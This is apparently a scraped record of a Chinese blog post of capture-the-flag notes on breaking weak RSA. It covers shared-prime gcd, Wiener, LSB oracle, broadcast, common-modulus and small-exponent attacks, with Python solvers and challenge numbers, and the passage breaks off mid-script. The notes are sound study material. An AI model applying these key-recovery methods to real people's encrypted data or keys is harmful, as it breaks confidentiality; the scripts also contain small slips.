https://github.com/pablocelayes/rsa-wiener-attack.git !\n    frac = ContinuedFractions.rational_to_contfrac(e, n)\n    convergents = ContinuedFractions.convergents_from_contfrac(frac)\n    for (k, d) in convergents:\n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discr = s * s - 4 * n\n            if (discr >= 0):\n                t = Arithmetic.is_perfect_square(discr)\n                if t != -1 and (s + t) % 2 == 0:\n                    print(\"Hacked!\")\n                    return d\n    return False\n```\n\n## 私钥文件修复\n\n## LSB Oracle Attack\n\n适用情况：可以选择密文并泄露最低位。\n\n```python\nimport decimal\ndef oracle():\n    return lsb == 'odd'\n\n\ndef partial(c, e, n):\n    k = n.bit_length()\n    decimal.getcontext().prec = k  # for 'precise enough' floats\n    lo = decimal.Decimal(0)\n    hi = decimal.Decimal(n)\n    for i in range(k):\n        if not oracle(c):\n            hi = (lo + hi) / 2\n        else:\n            lo = (lo + hi) / 2\n        c = (c * pow(2, e, n)) % n\n        # print i, int(hi - lo)\n    return int(hi)\n```\n\n## 选择密文攻击\n\n选择密文攻击\n适用情况：可以构造任意密文并获得对应明文。\n\n这个好理解，在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足`gcd(x,n)==1` 从而使x模n的逆存在，构造密文 `c'=c*(x^e) `使解密后明文为 `m'=(m*x)%n` ，则`m=m'*x^-1(mod n)` 。可参看模意义下的运算法则部分 。\n\n## 广播攻击\n\n适用情况：模数n、密文c不同，明文m、加密指数e相同。一般会是e=k，然后给k组数据\n\n使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个`(m^e) ==ci (mod ni)`，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况。按照本文的中国剩余定理小节容易求得m^e的值，当e较小时直接开e方即可，可使用`gmpy2.iroot(M,e)` 方法。\n\n案例:\n\n```python\ndef CRT(mi, ai):\n    # mi,ai分别表示模数和取模后的值,都为列表结构\n    # Chinese Remainder Theorem\n    # lcm=lambda x , y:x*y/gcd(x,y)\n    # mul=lambda x , y:x*y\n    # assert(reduce(mul,mi)==reduce(lcm,mi))\n    # 以上可用于保证mi两两互质\n    assert (isinstance(mi, list) and isinstance(ai, list))\n    M = reduce(lambda x, y: x * y, mi)\n    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) for (m, a) in zip(mi, ai)]\n    return reduce(lambda x, y: x + y, ai_ti_Mi) % M\n\nm = random.randint(0x100000000000, 0xffffffffffff)\ne = 3\nn1 = 0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555L\nn2 = 0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867L\nn3 = 0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303L\nc1 = pow(m, e, n1)\nc2 = pow(m, e, n2)\nc3 = pow(m, e, n3)\nprint m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[0]\n```\n\n","source":"_posts/RSA学习.md","raw":"---\ntitle: RSA学习\ndate: 2018-07-17 17:21:46\ntags:\n---\n\n## openssl相关操作\n\n提取pubkey.pem相关信息\n\n```\n openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem\n```\n\n解密:\n\n```\nopenssl rsautl -decrypt -in 【flag.enc】 -inkey 【private.pem】\n```\n\n## 已知p,q\n\n若已知质数p和q，则通过依次计算欧拉函数值phi、私钥d可解密。在选取加密指数e时要求phi，e互质，也就是gcd(phi,e)==1 ，如果不满足是无法直接解密的。\n\n```\ndef rsa_decrypt(e, c, p, q):\n    phi = (p - 1) * (q - 1)\n    n = p * q\n    try:\n        d = gmpy2.invert(e, phi) #求e模phi的逆\n        return pow(c, d, n)\n    except Exception as e:\n        print \"e and phi are not coprime!\"\n        raise e\n```\n\n## 查询已知的n的可分解情况\n\n在线查询：https://factordb.com/\n\napi接口：\n\n```\ncurl http://factordb.com/api?query=12345\n\nresponse:\n\n{\"id\":\"12345\",\"status\":\"FF\",\"factors\":[[\"3\",1],[\"5\",1],[\"823\",1]]}\n\n```\n\n## 使用yafu分解N\n\n适用情况：p,q相差较大或较小时可快速分解。\n\n使用方法：yafu-x64.exe factor(233) ，yafu-x64.exe help\n\nurl: ```https://www.cnblogs.com/pcat/p/7508205.html```\n\n## 模不互素 （gcd(N1,N2)!=1）\n\n适用情况：存在两个或更多模数 ，且gcd(N1,N2)!=1 。\n\n多个模数n共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一gcd(N1,N2) ，然后这个最大公约数可用于分解模数分别得到对应的p和q，即可进行解密。实现参照本文欧几里得算法 部分和RSA解密 部分。\n\n案例: 安恒2018 6月赛:\n\n该题目提供20个n和20个相对应的密文，由于e为65537，所以可以排除低指数广播攻击，通过分析，可以发现n4和n17并非互质，所以可以使用模不互素进行解密。\n\n```python\n# -*- coding:utf8\nimport gmpy2\nimport sys\nfrom libnum import gcd, n2s\nimport random\n\nn = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207\nc = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320\n\nn1 = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759\nc1 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855\n\nn2 = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491\nc2 = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862\n\nn3 = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751\nc3 = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613\n\nn4 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067\nc4 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357\n\nn5 = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369\nc5 = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932\n\nn6 = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137\nc6 = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179\n\nn7 = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191\nc7 = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006\n\nn8 = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941\nc8 = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934\n\nn9 = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491\nc9 = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869\n\nn10 = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019\nc10 = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467\n\nn11 = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299\nc11 = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971\n\nn12 = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551\nc12 = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175\n\nn13 = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987\nc13 = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457\n\nn14 = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837\nc14 = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842\n\nn15 = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451\nc15 = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724\n\nn16 = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499\nc16 = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024\n\nn17 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973\nc17 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887\n\nn18 = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603\nc18 = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889\n\nn19 = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659L\nc19 = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346L\n\n# e = 65537\n\nnlist = [n, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11, n12, n13, n14, n15, n16, n17, n18, n19]\nclist = [c, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, n19]\n\n# 寻找n-n19之间是否有互素的两个数\nfor i in range(20):\n\tfor j in range(20):\n\t\tif i == j:\n\t\t\tcontinue\n\t\telse:\n\t\t\tprint i, j, gcd(nlist[i], nlist[j])\n\np = 132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499\nq = 147764243536346715659432105628869451579704787136671496082719136693967862981444027430286693715470058237766749929595449234542432638995582675309345203650862074805309250048791833572328389815134763390112740125416594657830110772787259287349943894208620126222405887247024583782974900764827221144394822451457152873527\n# n17 = p1 * p2\nprint gmpy2.is_prime(132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499)\n\nprint gmpy2.is_prime(147764243536346715659432105628869451579704787136671496082719136693967862981444027430286693715470058237766749929595449234542432638995582675309345203650862074805309250048791833572328389815134763390112740125416594657830110772787259287349943894208620126222405887247024583782974900764827221144394822451457152873527)\n\n# m = random.randint(0x100000000000, 0xffffffffffff)b\n# \ndef rsa_decrypt(e, c, p, q):\n    phi = (p - 1) * (q - 1)\n    n = p * q\n    try:\n        d = gmpy2.invert(e, phi) #求e模phi的逆\n        return pow(c, d, n)\n    except Exception as e:\n        print \"e and phi are not coprime!\"\n        raise e\ne = 65537\nprint n2s(rsa_decrypt(e, c17, p, q))\n```\n\n##  共模攻击\n\n适用情况：明文m、模数n相同，公钥指数e、密文c不同，gcd(e1,e2)==1\n\n```python\n# -*- coding: utf-8 -*-\n# by https://findneo.github.io/\n\nimport base64\nimport libnum\nimport gmpy2\n\n\ndef fix_py():\n    # decode encryption.encrypted\n    s1 = 'abdefghijklmpqrtuvwxyz'\n    s2 = 'dmenwfoxgpyhirasbktclu'\n    f1 = open('encryption.encrypted')\n    with open('encryption.py', 'w') as f2:\n        for i in f1.readlines():\n            tmp = ''\n            for j in i:\n                tmp += s2[s1.index(j)] if j in s1 else j\n            f2.write(tmp)\n# fix_py()\ndef common_modulus(n, e1, e2, c1, c2):\n    assert (libnum.gcd(e1, e2) == 1)\n    _, s1, s2 = gmpy2.gcdext(e1, e2)\n    m = pow(c1, s1, n) if s1 > 0 else pow(gmpy2.invert(c1, n), -s1, n)\n    m *= pow(c2, s2, n) if s2 > 0 else pow(gmpy2.invert(c2, n), -s2, n)\n    m %= n\n    return m\n\n\n[n2, n3] = map(lambda x: int(base64.b64decode(x).encode('hex'), 16),\n               open('n2&n3').readlines())\n[n1c1, n1c2] = map(lambda x: int(x, 16), open('n1.encrypted').readlines())\n[msg1c1, msg2c2] = map(lambda x: int(x, 16), open('ciphertext').readlines())\n# 通过共模攻击得到n1\ne1 = 0x1001\ne2 = 0x101\nn1 = common_modulus(n3, e1, e2, n1c1, n1c2)\n# n1,n2有一个共有质因数p1\n# n1 += n3  # 存在n3比n1小的可能，并且确实如此;貌似主办方中途改题，把n1改成小于n3了。\np1 = gmpy2.gcd(n1, n2)\nassert (p1 != 1)\np2 = n1 / p1\np3 = n2 / p1\ne = 0x1001\nd1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1))\nd2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1))\nmsg1 = pow(msg1c1, d1, n1)\nmsg2 = pow(msg2c2, d2, n2)\nmsg1 = hex(msg1)[2:].decode('hex')\nmsg2 = hex(msg2)[2:].decode('hex')\nprint msg1, msg2\n# XA{RP0I_0Itrsigi s.y\n# MNCYT_55_neetnvmrap}\n# XMAN{CRYPT0_I5_50_Interestingvim rsa.py}\n```\n\n## 小明文攻击\n\n适用情况：e较小，一般为3。\n\n公钥e很小，明文m也不大的话，于是m^e=k*n+m 中的的k值很小甚至为0，爆破k或直接开三次方即可。\n\n```python\ndef small_msg(e, n, c):\n    print time.asctime(), \"Let's waiting...\"\n    for k in xrange(200000000):\n        if gmpy2.iroot(c + n * k, e)[1] == 1:\n            print time.asctime(), \"...done!\"\n            return gmpy2.iroot(c + n * k, 3)[0]\n```\n\n```python\nimport gmpy2,binascii,libnum,time\nn=0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929\ne=3\nres=0\nc=int(open('extremelyhardRSA.rar/flag.enc','rb').read().encode('hex'),16)\nprint time.asctime()\nfor i in xrange(200000000):\n    if gmpy2.iroot(c+n*i,3)[1]==1:\n        